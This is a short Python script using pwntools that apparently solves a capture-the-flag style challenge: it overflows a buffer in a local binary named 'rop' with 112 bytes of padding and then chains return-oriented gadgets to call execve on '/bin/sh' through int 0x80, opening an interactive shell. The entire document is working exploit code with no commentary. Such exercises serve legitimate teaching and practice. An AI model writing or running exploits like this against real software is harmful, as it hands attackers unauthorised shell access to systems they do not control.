from pwn import *

p = process('./rop')


pop_eax_ret = 0x080bb196

pop_edx_ecx_ebx_ret = 0x0806eb90

binsh_addr = 0x080be408

int0x80_addr = 0x08049421

payload = b'A' * 112 + p32(pop_eax_ret) + p32(0xb) + p32(pop_edx_ecx_ebx_ret) + p32(0) + p32(0) + p32(binsh_addr) + p32(int0x80_addr)


p.recvuntil("What do you plan to do?\n");

p.sendline(payload)

p.interactive()

